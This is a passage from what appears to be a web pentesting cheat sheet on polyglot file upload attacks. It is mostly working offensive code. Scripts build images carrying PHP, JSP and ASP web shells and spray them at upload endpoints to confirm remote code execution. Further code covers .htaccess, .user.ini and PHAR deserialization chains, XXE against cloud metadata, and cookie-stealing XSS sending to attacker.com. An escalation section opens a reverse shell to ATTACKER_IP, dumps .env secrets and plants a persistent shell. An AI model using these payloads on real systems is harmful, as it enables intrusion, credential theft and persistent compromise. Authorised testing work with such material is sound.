
      if entity_type == "file":
          dtd = f'<!ENTITY xxe SYSTEM "file://{xxe_entity}">'
      elif entity_type == "http":
          dtd = f'<!ENTITY xxe SYSTEM "{xxe_entity}">'
      elif entity_type == "oob":
          dtd = f'''<!ENTITY % file SYSTEM "file://{xxe_entity}">
  <!ENTITY % dtd SYSTEM "http://ATTACKER_IP:8080/xxe.dtd">
  %dtd;'''

      with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
          zf.writestr('[Content_Types].xml', '''<?xml version="1.0" encoding="UTF-8"?>
  <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
    <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
    <Override PartName="/xl/sharedStrings.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/>
  </Types>''')

          zf.writestr('_rels/.rels', '''<?xml version="1.0" encoding="UTF-8"?>
  <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
  </Relationships>''')

          zf.writestr('xl/_rels/workbook.xml.rels', '''<?xml version="1.0" encoding="UTF-8"?>
  <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
    <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings" Target="sharedStrings.xml"/>
  </Relationships>''')

          zf.writestr('xl/workbook.xml', '''<?xml version="1.0" encoding="UTF-8"?>
  <workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <sheets><sheet name="Sheet1" sheetId="1" r:id="rId1" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/></sheets>
  </workbook>''')

          # XXE in sharedStrings.xml
          zf.writestr('xl/sharedStrings.xml', f'''<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [{dtd}]>
  <sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
    <si><t>{"&xxe;" if entity_type != "oob" else "&send;"}</t></si>
  </sst>''')

          zf.writestr('xl/worksheets/sheet1.xml', '''<?xml version="1.0" encoding="UTF-8"?>
  <worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <sheetData>
      <row r="1"><c r="A1" t="s"><v>0</v></c></row>
    </sheetData>
  </worksheet>''')

      print(f"[+] {output_path} — XLSX/XXE polyglot")

  create_xlsx_xxe("xlsx_xxe_passwd.xlsx", "/etc/passwd", "file")
  create_xlsx_xxe("xlsx_xxe_aws.xlsx", "http://169.254.169.254/latest/meta-data/", "http")
  create_xlsx_xxe("xlsx_xxe_oob.xlsx", "/etc/hostname", "oob")
  ```
  :::
::

---

## Automated Polyglot Generation & Testing

### Universal Polyglot Generator

::code-collapse
```python [universal_polyglot_generator.py]
#!/usr/bin/env python3
"""
Universal Polyglot File Generator
Creates polyglot files for multiple format combinations and shell types
"""
import struct
import zlib
import os
import sys
from PIL import Image
import io

class UniversalPolyglotGenerator:
    SHELLS = {
        "php_system":    b'<?php system($_GET["cmd"]); ?>',
        "php_eval":      b'<?php eval($_POST["e"]); ?>',
        "php_exec":      b'<?php echo shell_exec($_REQUEST["cmd"]); ?>',
        "php_minimal":   b'<?=`$_GET[c]`?>',
        "php_base64":    b'<?php eval(base64_decode($_POST["e"])); ?>',
        "php_passthru":  b'<?php passthru($_GET["cmd"]); ?>',
        "php_assert":    b'<?php @assert($_REQUEST["cmd"]); ?>',
        "php_info":      b'<?php phpinfo(); ?>',
        "php_file_read": b'<?php echo file_get_contents($_GET["f"]); ?>',
        "jsp_basic":     b'<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
        "asp_eval":      b'<%eval request("cmd")%>',
        "xss_alert":     b'<script>alert(document.domain)</script>',
        "xss_steal":     b'<script>fetch("//evil.com/"+document.cookie)</script>',
        "ssi_exec":      b'<!--#exec cmd="id"-->',
        "poc_harmless":  b'<?php echo "POLYGLOT_POC_SUCCESS"; ?>',
    }

    def __init__(self, output_dir="polyglots"):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        self.generated = []

    def _save(self, filename, data):
        path = os.path.join(self.output_dir, filename)
        with open(path, 'wb') as f:
            f.write(data)
        self.generated.append(path)
        return path

    def _valid_jpeg(self, width=100, height=100):
        img = Image.new('RGB', (width, height), 'blue')
        pixels = img.load()
        for x in range(width):
            for y in range(height):
                pixels[x, y] = ((x*7)%256, (y*13)%256, ((x+y)*3)%256)
        buf = io.BytesIO()
        img.save(buf, 'JPEG', quality=95)
        return buf.getvalue()

    def _valid_png(self, width=100, height=100):
        img = Image.new('RGBA', (width, height), (255, 0, 0, 255))
        buf = io.BytesIO()
        img.save(buf, 'PNG')
        return buf.getvalue()

    def _valid_gif(self, width=100, height=100):
        img = Image.new('RGB', (width, height), 'green')
        buf = io.BytesIO()
        img.save(buf, 'GIF')
        return buf.getvalue()

    def _valid_bmp(self, width=100, height=100):
        img = Image.new('RGB', (width, height), 'yellow')
        buf = io.BytesIO()
        img.save(buf, 'BMP')
        return buf.getvalue()

    def jpeg_com_polyglot(self, shell_name, shell_code):
        jpeg = self._valid_jpeg()
        com = b'\xff\xfe' + struct.pack('>H', len(shell_code) + 2) + shell_code
        polyglot = jpeg[:2] + com + jpeg[2:]
        return polyglot

    def jpeg_exif_polyglot(self, shell_name, shell_code):
        jpeg = self._valid_jpeg()
        exif = b'Exif\x00\x00II\x2a\x00\x08\x00\x00\x00\x01\x00\x0e\x01\x02\x00'
        exif += struct.pack('<I', len(shell_code) + 1)
        exif += struct.pack('<I', 26)
        exif += b'\x00\x00\x00\x00'
        exif += shell_code + b'\x00'
        app1 = b'\xff\xe1' + struct.pack('>H', len(exif) + 2) + exif
        polyglot = jpeg[:2] + app1 + jpeg[2:]
        return polyglot

    def png_text_polyglot(self, shell_name, shell_code):
        png = self._valid_png()
        def make_chunk(t, d):
            c = t + d
            return struct.pack('>I', len(d)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)
        text = make_chunk(b'tEXt', b'Comment\x00' + shell_code)
        iend_pos = png.rfind(b'IEND') - 4
        polyglot = png[:iend_pos] + text + png[iend_pos:]
        return polyglot

    def gif_comment_polyglot(self, shell_name, shell_code):
        gif = self._valid_gif()
        comment = b'\x21\xfe'
        for i in range(0, len(shell_code), 255):
            block = shell_code[i:i+255]
            comment += bytes([len(block)]) + block
        comment += b'\x00'
        trailer_pos = gif.rfind(b'\x3b')
        polyglot = gif[:trailer_pos] + comment + b'\x3b'
        return polyglot

    def gif_simple_polyglot(self, shell_name, shell_code):
        return b'GIF89a' + shell_code

    def bmp_polyglot(self, shell_name, shell_code):
        bmp = self._valid_bmp()
        return bmp + shell_code

    def generate_all(self, shell_names=None):
        if shell_names is None:
            shell_names = list(self.SHELLS.keys())

        generators = {
            "jpeg_com":   self.jpeg_com_polyglot,
            "jpeg_exif":  self.jpeg_exif_polyglot,
            "png_text":   self.png_text_polyglot,
            "gif_comment": self.gif_comment_polyglot,
            "gif_simple": self.gif_simple_polyglot,
            "bmp_append": self.bmp_polyglot,
        }

        ext_map = {
            "jpeg_com": "jpg", "jpeg_exif": "jpg",
            "png_text": "png", "gif_comment": "gif",
            "gif_simple": "gif", "bmp_append": "bmp",
        }

        total = 0
        for shell_name in shell_names:
            shell_code = self.SHELLS[shell_name]
            for gen_name, gen_func in generators.items():
                try:
                    data = gen_func(shell_name, shell_code)
                    img_ext = ext_map[gen_name]

                    # Multiple filename patterns
                    filenames = [
                        f"{gen_name}_{shell_name}.php.{img_ext}",
                        f"{gen_name}_{shell_name}.{img_ext}",
                        f"{gen_name}_{shell_name}.phtml.{img_ext}",
                    ]

                    for fn in filenames:
                        self._save(fn, data)
                        total += 1

                except Exception as e:
                    print(f"[-] {gen_name}/{shell_name}: {e}")

        print(f"\n[+] Generated {total} polyglot files in {self.output_dir}/")
        return self.generated

    def verify_all(self):
        print(f"\n[*] Verifying generated polyglots...")
        for path in self.generated:
            try:
                img = Image.open(path)
                img.verify()
                fmt = img.format
                with open(path, 'rb') as f:
                    has_php = b'<?php' in f.read() or b'<?=' in f.read()
                status = "✓ Valid" if fmt else "? Unknown"
                print(f"  [{status:8s}] {os.path.basename(path):50s} ({fmt})")
            except Exception:
                with open(path, 'rb') as f:
                    data = f.read(10)
                if data[:3] == b'GIF':
                    print(f"  [✓ GIF   ] {os.path.basename(path)}")
                elif data[:2] == b'BM':
                    print(f"  [✓ BMP   ] {os.path.basename(path)}")
                else:
                    print(f"  [? Check ] {os.path.basename(path)}")


if __name__ == "__main__":
    gen = UniversalPolyglotGenerator("polyglots_output")

    # Generate for specific shells
    gen.generate_all(["php_system", "php_minimal", "php_eval", "poc_harmless", "xss_alert"])

    # Verify
    gen.verify_all()
```
::

### Automated Upload & Verification

::code-group
```python [polyglot_upload_spray.py]
#!/usr/bin/env python3
"""Spray all generated polyglots against target upload endpoint"""
import requests
import os
import time
import sys
import urllib3
urllib3.disable_warnings()

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://target.com/api/upload"
FIELD = "file"
COOKIE = {"session": "AUTH_TOKEN"}
POLYGLOT_DIR = "polyglots_output"
VERIFY_BASE = "https://target.com"

session = requests.Session()
session.verify = False
session.cookies.update(COOKIE)

content_types = {
    ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
    ".png": "image/png", ".gif": "image/gif",
    ".bmp": "image/bmp", ".svg": "image/svg+xml",
}

accepted = []
executed = []

print(f"[*] Spraying polyglots from {POLYGLOT_DIR}/ to {TARGET}")
print("-" * 70)

for filename in sorted(os.listdir(POLYGLOT_DIR)):
    filepath = os.path.join(POLYGLOT_DIR, filename)
    if not os.path.isfile(filepath):
        continue

    ext = os.path.splitext(filename)[1].lower()
    ct = content_types.get(ext, "application/octet-stream")

    with open(filepath, 'rb') as f:
        files = {FIELD: (filename, f.read(), ct)}

    try:
        r = session.post(TARGET, files=files, timeout=15)
        success = r.status_code in [200, 201] and any(
            w in r.text.lower() for w in ["success", "upload", "saved", "url", "path"]
        )

        if success:
            accepted.append(filename)
            print(f"[+] ACCEPTED: {filename}")

            # Try to extract upload URL from response
            import re
            urls = re.findall(r'https?://[^\s"\']+', r.text)
            for url in urls:
                if any(ext in url for ext in ['.php', '.jpg', '.png', '.gif']):
                    # Try to execute
                    for param in ['cmd', 'c']:
                        try:
                            er = session.get(url, params={param: 'id'}, timeout=5)
                            if 'uid=' in er.text:
                                executed.append((filename, url, param))
                                print(f"    [!!!] RCE: {url}?{param}=id")
                        except:
                            pass
    except Exception as e:
        print(f"[-] ERROR: {filename}: {e}")

    time.sleep(0.5)

print(f"\n{'='*70}")
print(f"[*] Results: {len(accepted)} accepted, {len(executed)} RCE confirmed")
if executed:
    print(f"\n[+] Confirmed RCE:")
    for fn, url, param in executed:
        print(f"    {fn} → {url}?{param}=id")
```

```bash [Mass Verification Script]
#!/bin/bash
# verify_polyglot_shells.sh — Check all possible locations for uploaded shells

TARGET="https://target.com"
POLYGLOT_DIR="polyglots_output"

UPLOAD_DIRS=(
    "" "uploads" "images" "media" "files" "static"
    "assets" "content" "upload" "img" "data"
    "public" "storage" "user-content" "avatars"
    "wp-content/uploads" "tmp"
)

echo "[*] Checking for accessible polyglot shells..."

for filename in "$POLYGLOT_DIR"/*; do
    BASENAME=$(basename "$filename")
    for dir in "${UPLOAD_DIRS[@]}"; do
        URL="${TARGET}/${dir}/${BASENAME}"
        [ -n "$dir" ] || URL="${TARGET}/${BASENAME}"

        STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL" 2>/dev/null)

        if [ "$STATUS" = "200" ]; then
            RESULT=$(curl -s "${URL}?cmd=id" 2>/dev/null)
            if echo "$RESULT" | grep -q "uid="; then
                echo "[+] RCE: ${URL}?cmd=id"
                echo "    Output: $(echo "$RESULT" | grep "uid=" | head -1)"
            elif echo "$RESULT" | grep -q "POLYGLOT_POC"; then
                echo "[+] PHP Exec (PoC): ${URL}"
            else
                echo "[~] Exists (200): ${URL}"
            fi
        fi
    done
done
```
::

---

## Polyglot Chains & Advanced Attacks

### Multi-Stage Exploitation

::card-group
  :::card
  ---
  icon: i-lucide-link
  title: Polyglot → .htaccess → RCE
  ---
  1. Upload polyglot JPEG/PHP as `avatar.jpg` (passes all checks)
  2. Upload `.htaccess` with `AddType application/x-httpd-php .jpg`
  3. Access `avatar.jpg?cmd=id` — PHP executes from image extension
  4. Server treats all `.jpg` files as PHP in that directory
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Polyglot → .user.ini → RCE
  ---
  1. Upload polyglot GIF/PHP as `shell.gif`
  2. Upload `.user.ini` with `auto_prepend_file=shell.gif`
  3. Access ANY `.php` file in the same directory
  4. PHP auto-includes `shell.gif` before every request
  :::

  :::card
  ---
  icon: i-lucide-link
  title: PHAR Polyglot → Deserialization → RCE
  ---
  1. Upload PHAR/JPEG polyglot as `image.jpg`
  2. Find endpoint using `file_exists()` or `getimagesize()` with user input
  3. Inject `phar://uploads/image.jpg/test.txt` as path
  4. PHP deserializes PHAR metadata → gadget chain fires → RCE
  :::

  :::card
  ---
  icon: i-lucide-link
  title: SVG Polyglot → Stored XSS → Account Takeover
  ---
  1. Upload SVG with JavaScript as profile picture
  2. Another user views the attacker's profile
  3. SVG JavaScript executes in victim's browser context
  4. Steal session cookie → account takeover
  :::

  :::card
  ---
  icon: i-lucide-link
  title: DOCX Polyglot → XXE → AWS Keys
  ---
  1. Upload DOCX with XXE targeting AWS metadata endpoint
  2. Server parses DOCX XML (resume parser, document converter)
  3. XXE fetches `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
  4. AWS IAM credentials exfiltrated
  :::

  :::card
  ---
  icon: i-lucide-link
  title: PNG IDAT Polyglot → GD Re-encode Survive → RCE
  ---
  1. Craft PNG with PHP in IDAT compressed pixel data
  2. Upload passes all validation including GD re-encoding
  3. Re-encoded PNG still contains PHP in pixel data
  4. Include via LFI or execute via handler override
  :::
::

### Chain Implementation Examples

::code-group
```bash [.htaccess + Polyglot Chain]
# ── Stage 1: Upload .htaccess ──
cat > .htaccess << 'EOF'
AddType application/x-httpd-php .jpg .jpeg .png .gif .bmp
php_flag engine on
# Alternative: using SetHandler
<FilesMatch "\.(jpg|jpeg|png|gif)$">
    SetHandler application/x-httpd-php
</FilesMatch>
EOF

curl -X POST https://target.com/api/upload \
  -F "file=@.htaccess;filename=.htaccess" \
  -H "Cookie: session=TOKEN"

# ── Stage 2: Upload polyglot image ──
# Create valid JPEG with PHP in COM segment
python3 -c "
from PIL import Image
import struct, io
img = Image.new('RGB', (100,100), 'red')
buf = io.BytesIO()
img.save(buf, 'JPEG', quality=95)
jpg = buf.getvalue()
php = b'<?php system(\$_GET[\"cmd\"]); ?>'
com = b'\xff\xfe' + struct.pack('>H', len(php)+2) + php
poly = jpg[:2] + com + jpg[2:]
open('avatar.jpg','wb').write(poly)
"

curl -X POST https://target.com/api/upload \
  -F "file=@avatar.jpg;type=image/jpeg" \
  -H "Cookie: session=TOKEN"

# ── Stage 3: Execute ──
curl -s "https://target.com/uploads/avatar.jpg?cmd=id"
```

```bash [.user.ini + Polyglot Chain]
# ── For PHP-FPM environments ──

# Stage 1: Upload polyglot
echo -n 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
curl -X POST https://target.com/api/upload \
  -F "file=@shell.gif;type=image/gif" \
  -H "Cookie: session=TOKEN"

# Stage 2: Upload .user.ini
echo 'auto_prepend_file=shell.gif' > .user.ini
curl -X POST https://target.com/api/upload \
  -F "file=@.user.ini;filename=.user.ini" \
  -H "Cookie: session=TOKEN"

# Stage 3: Access any PHP file in the upload directory
# PHP-FPM will auto-include shell.gif before processing
curl -s "https://target.com/uploads/index.php?cmd=id"
# Or if there's no PHP file, try to find one:
curl -s "https://target.com/uploads/?cmd=id"

# ── Alternative: auto_append_file ──
echo 'auto_append_file=shell.gif' > .user.ini
```

```bash [PHAR Deserialization Chain]
# ── Stage 1: Generate PHAR polyglot with phpggc ──
git clone https://github.com/ambionics/phpggc.git 2>/dev/null
cd phpggc

# Generate for common frameworks
./phpggc Monolog/RCE1 system id -p phar -o ../phar_shell.jpg -pp "\xFF\xD8\xFF\xE0"
cd ..

# ── Stage 2: Upload as image ──
curl -X POST https://target.com/api/upload \
  -F "file=@phar_shell.jpg;type=image/jpeg;filename=avatar.jpg" \
  -H "Cookie: session=TOKEN"

# ── Stage 3: Trigger deserialization ──
# Find endpoint that performs file operations on user input
# Common patterns:
curl -s "https://target.com/thumbnail?path=phar://uploads/avatar.jpg/test.txt"
curl -s "https://target.com/check-file?f=phar://uploads/avatar.jpg"
curl -s "https://target.com/api/file-info?file=phar://uploads/avatar.jpg/test.txt"
curl -s "https://target.com/image/resize?src=phar://uploads/avatar.jpg"

# ── Stage 4: Verify RCE ──
# If the gadget chain executed system('id'), check for output
# Or use OOB callback:
./phpggc Monolog/RCE1 system 'curl http://ATTACKER/rce_confirmed' \
  -p phar -o phar_callback.jpg -pp "\xFF\xD8\xFF\xE0"

curl -X POST https://target.com/api/upload \
  -F "file=@phar_callback.jpg;type=image/jpeg" \
  -H "Cookie: session=TOKEN"

# Trigger and check your HTTP server for callback
curl -s "https://target.com/thumbnail?path=phar://uploads/phar_callback.jpg/test.txt"
```
::

---

## Content-Type Sniffing Polyglots

::note
Some browsers and servers perform **content-type sniffing** — they examine file contents to determine the MIME type instead of trusting headers. Polyglots can exploit this by being interpreted differently depending on the context (image viewer vs browser rendering engine).
::

::tabs
  :::tabs-item{icon="i-lucide-globe" label="HTML/Image Polyglot"}
  ```python [html_image_polyglot.py]
  #!/usr/bin/env python3
  """
  Create files that are valid images but render as HTML in browsers
  that perform content-type sniffing.
  Exploits: X-Content-Type-Options: nosniff NOT being set
  """

  # GIF + HTML polyglot
  # GIF89a header followed by HTML that closes the GIF context
  gif_html = b'GIF89a'
  gif_html += b'/*'  # Open CSS/JS comment to hide binary
  gif_html += b'\x01\x00\x01\x00\x80\x00\x00'  # GIF dimensions
  gif_html += b'\xff\xff\xff\x00\x00\x00'  # Color table
  gif_html += b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00'  # Image descriptor
  gif_html += b'\x02\x02\x44\x01\x00'  # Image data
  gif_html += b'\x3b'  # GIF trailer
  gif_html += b'*/'  # Close comment
  gif_html += b'''<html>
  <body>
  <script>
  // This executes if browser sniffs content as HTML
  alert('Content-Type Sniffing XSS on ' + document.domain);
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
  </script>
  </body>
  </html>'''

  with open('gif_html_polyglot.gif', 'wb') as f:
      f.write(gif_html)

  # JPEG + HTML polyglot
  jpeg_html = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
  jpeg_html += b'\xff\xfe'  # COM marker
  comment = b'''</style><script>alert(document.domain)</script><style>'''
  import struct
  jpeg_html += struct.pack('>H', len(comment) + 2) + comment
  jpeg_html += b'\xff\xd9'

  with open('jpeg_html_polyglot.jpg', 'wb') as f:
      f.write(jpeg_html)

  # BMP + HTML polyglot
  bmp_html = b'BM'
  bmp_html += b'\x00' * 52  # BMP header padding
  bmp_html += b'''<html><script>alert(document.domain)</script></html>'''

  with open('bmp_html_polyglot.bmp', 'wb') as f:
      f.write(bmp_html)

  print("[+] Content-type sniffing polyglots generated")
  print("[*] These work when X-Content-Type-Options: nosniff is NOT set")
  print("[*] Upload as image, then access directly in browser")
  ```
  :::

  :::tabs-item{icon="i-lucide-globe" label="Detection & Exploitation"}
  ```bash
  # ── Check if target is vulnerable to content-type sniffing ──

  # Check for nosniff header
  curl -sI https://target.com/uploads/any_image.jpg | grep -i "x-content-type-options"
  # If "nosniff" is NOT present → vulnerable to sniffing attacks

  # Check CDN headers
  curl -sI https://cdn.target.com/images/test.jpg | grep -iE "x-content-type-options|content-type"

  # Upload GIF/HTML polyglot
  curl -X POST https://target.com/api/upload \
    -F "file=@gif_html_polyglot.gif;type=image/gif" \
    -H "Cookie: session=TOKEN"

  # Access directly in browser
  # If the file renders as HTML instead of displaying as image → XSS

  # Test via curl (check content-type in response)
  curl -sI "https://target.com/uploads/gif_html_polyglot.gif" | grep -i "content-type"
  # If Content-Type is text/html → browser will execute JavaScript
  # If Content-Type is image/gif → browser renders as image (safe)
  # If no Content-Type → browser sniffs → may execute JavaScript

  # ── Check multiple uploaded file locations ──
  for path in uploads images media files static assets; do
      RESPONSE=$(curl -sI "https://target.com/${path}/gif_html_polyglot.gif" 2>/dev/null)
      CT=$(echo "$RESPONSE" | grep -i "content-type" | tr -d '\r')
      NOSNIFF=$(echo "$RESPONSE" | grep -i "x-content-type-options" | tr -d '\r')
      STATUS=$(echo "$RESPONSE" | head -1 | awk '{print $2}')
      echo "[${STATUS}] /${path}/ — ${CT} | ${NOSNIFF:-NO nosniff header}"
  done
  ```
  :::
::

---

## Post-Exploitation & Impact Proof

::tabs
  :::tabs-item{icon="i-lucide-shield" label="Safe PoC for Bug Bounty"}
  ```bash
  # ── Create harmless polyglot for proof of concept ──

  TIMESTAMP=$(date +%s)

  # Harmless PHP PoC (no system commands)
  python3 -c "
  from PIL import Image
  import struct, io

  img = Image.new('RGB', (200, 200), 'purple')
  buf = io.BytesIO()
  img.save(buf, 'JPEG', quality=95)
  jpg = buf.getvalue()

  poc = f'<?php echo \"POLYGLOT_POC_${TIMESTAMP}\"; echo \" | Server: \".php_uname(); echo \" | PHP: \".phpversion(); ?>'.encode()
  com = b'\xff\xfe' + struct.pack('>H', len(poc)+2) + poc
  poly = jpg[:2] + com + jpg[2:]
  open('poc_polyglot_${TIMESTAMP}.php.jpg','wb').write(poly)

  # Verify
  img2 = Image.open('poc_polyglot_${TIMESTAMP}.php.jpg')
  img2.verify()
  print(f'[+] Valid JPEG: {img2.size} {img2.format}')
  print(f'[+] File: poc_polyglot_${TIMESTAMP}.php.jpg ({len(poly)} bytes)')
  "

  # Upload
  curl -X POST https://target.com/api/upload \
    -F "file=@poc_polyglot_${TIMESTAMP}.php.jpg;type=image/jpeg" \
    -H "Cookie: session=TOKEN" | tee upload_response.txt

  # Verify execution
  echo ""
  echo "[*] Checking execution..."
  curl -s "https://target.com/uploads/poc_polyglot_${TIMESTAMP}.php.jpg"

  echo ""
  echo "═══ Report Template ═══"
  echo "Title: Remote Code Execution via Polyglot File Upload Bypass"
  echo "Severity: Critical"
  echo "Endpoint: POST /api/upload"
  echo "Technique: JPEG/PHP polyglot (COM segment injection)"
  echo "Validation Bypassed: Magic bytes, file parsing, Content-Type"
  echo "PoC Timestamp: ${TIMESTAMP}"
  echo "Impact: Arbitrary PHP code execution as web server user"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Escalation Commands"}
  ```bash
  # ── After confirming polyglot RCE ──

  SHELL_URL="https://target.com/uploads/polyglot.php.jpg"

  # System enumeration
  curl -s "${SHELL_URL}?cmd=id;hostname;uname+-a;cat+/etc/os-release"

  # Reverse shell upgrade
  # Start listener: nc -lvnp 4444
  curl -s "${SHELL_URL}" --data-urlencode \
    "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"

  # Data extraction
  curl -s "${SHELL_URL}" --data-urlencode "cmd=find / -name '.env' -type f 2>/dev/null"
  curl -s "${SHELL_URL}" --data-urlencode "cmd=cat /var/www/html/.env"
  curl -s "${SHELL_URL}" --data-urlencode "cmd=env | grep -iE 'key|secret|pass|token|database'"

  # Write persistent shell (if needed for report)
  curl -s "${SHELL_URL}" --data-urlencode \
    "cmd=echo '<?php system(\$_GET[\"cmd\"]); ?>' > /var/www/html/uploads/persistent.php"
  ```
  :::
::

---

## References & Resources

::card-group
  :::card
  ---
  icon: i-lucide-external-link
  title: OWASP — Unrestricted File Upload
  to: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
  target: _blank
  ---
  OWASP guide covering all file upload attack classes including polyglot techniques, defense strategies, and testing methodologies.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: Encoding Web Shells in PNG IDAT Chunks
  to: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
  target: _blank
  ---
  Seminal research on creating PHP webshells that survive GD library re-encoding by encoding payloads within PNG pixel data.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PortSwigger — File Upload Vulnerabilities
  to: https://portswigger.net/web-security/file-upload
  target: _blank
  ---
  PortSwigger Web Security Academy with interactive labs covering file upload bypasses, polyglots, and race conditions.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: phpggc — PHP Generic Gadget Chains
  to: https://github.com/ambionics/phpggc
  target: _blank
  ---
  Tool for generating PHP deserialization gadget chains — essential for PHAR polyglot exploitation against Laravel, Symfony, WordPress, etc.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackTricks — File Upload Bypass
  to: https://book.hacktricks.wiki/en/pentesting-web/file-upload/
  target: _blank
  ---
  Comprehensive cheatsheet covering polyglots, double extensions, null bytes, magic bytes, and server-specific upload bypasses.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PayloadsAllTheThings — Upload Insecure Files
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
  target: _blank
  ---
  Community-maintained payload repository with polyglot generators, extension lists, and bypass techniques for all major web platforms.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: File Signatures Table — Gary Kessler
  to: https://www.garykessler.net/library/file_sigs.html
  target: _blank
  ---
  Most comprehensive magic byte signature database — essential reference for crafting polyglots with correct file headers.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PHAR Deserialization — Sam Thomas Research
  to: https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf
  target: _blank
  ---
  Original Black Hat USA 2018 research on PHAR deserialization attacks, demonstrating exploitation through file operations on phar:// URIs.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: Corkami — Binary Polyglots
  to: https://github.com/corkami/docs/blob/master/binary-polyglots/README.md
  target: _blank
  ---
  Deep technical research on binary format polyglots covering PDF, ZIP, PE, ELF, and image format combinations with structural analysis.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: Portswigger Research — Content-Type Sniffing
  to: https://portswigger.net/research/content-type-sniffing
  target: _blank
  ---
  Research on browser content-type sniffing behavior and how polyglot files exploit the gap between declared and detected MIME types.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackerOne — File Upload Disclosed Reports
  to: https://hackerone.com/hacktivity?querystring=file%20upload%20polyglot
  target: _blank
  ---
  Real-world disclosed bug bounty reports demonstrating polyglot upload attacks on production applications.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: ExifTool — Read/Write Metadata
  to: https://exiftool.org/
  target: _blank
  ---
  Essential tool for injecting payloads into EXIF, IPTC, XMP, and other image metadata fields for polyglot construction.
  :::
::

---

## Quick Reference Cheatsheet

::field-group
  :::field{name="GIF + PHP (simplest)" type="command"}
  `echo 'GIF89a<?php system($_GET["cmd"]); ?>' > polyglot.gif`
  :::

  :::field{name="JPEG + PHP (COM)" type="command"}
  `python3 -c "from PIL import Image;import struct,io;img=Image.new('RGB',(1,1));buf=io.BytesIO();img.save(buf,'JPEG');j=buf.getvalue();p=b'<?php system(\$_GET[\"cmd\"]); ?>';open('poly.jpg','wb').write(j[:2]+b'\xff\xfe'+struct.pack('>H',len(p)+2)+p+j[2:])"`
  :::

  :::field{name="EXIF injection" type="command"}
  `exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o polyglot.php.jpg`
  :::

  :::field{name="PNG + PHP (tEXt)" type="command"}
  `exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.png -o polyglot.php.png`
  :::

  :::field{name="SVG XSS" type="command"}
  `echo '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>' > xss.svg`
  :::

  :::field{name="SVG XXE file read" type="command"}
  `echo '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>' > xxe.svg`
  :::

  :::field{name="PHAR + JPEG (phpggc)" type="command"}
  `phpggc Monolog/RCE1 system id -p phar -o phar.jpg -pp "\xFF\xD8\xFF\xE0"`
  :::

  :::field{name="Verify polyglot validity" type="command"}
  `python3 -c "from PIL import Image; i=Image.open('poly.jpg'); i.verify(); print(f'{i.format} {i.size}')" && strings poly.jpg | grep php`
  :::

  :::field{name="Upload polyglot" type="command"}
  `curl -X POST https://target.com/upload -F "file=@polyglot.php.jpg;type=image/jpeg" -H "Cookie: session=TOKEN"`
  :::

  :::field{name="Verify execution" type="command"}
  `curl -s "https://target.com/uploads/polyglot.php.jpg?cmd=id"`
  :::

  :::field{name="Check nosniff header" type="command"}
  `curl -sI https://target.com/uploads/test.jpg | grep -i x-content-type-options`
  :::

  :::field{name=".htaccess chain" type="command"}
  `echo 'AddType application/x-httpd-php .jpg' > .htaccess && curl -X POST https://target.com/upload -F "file=@.htaccess"`
  :::
::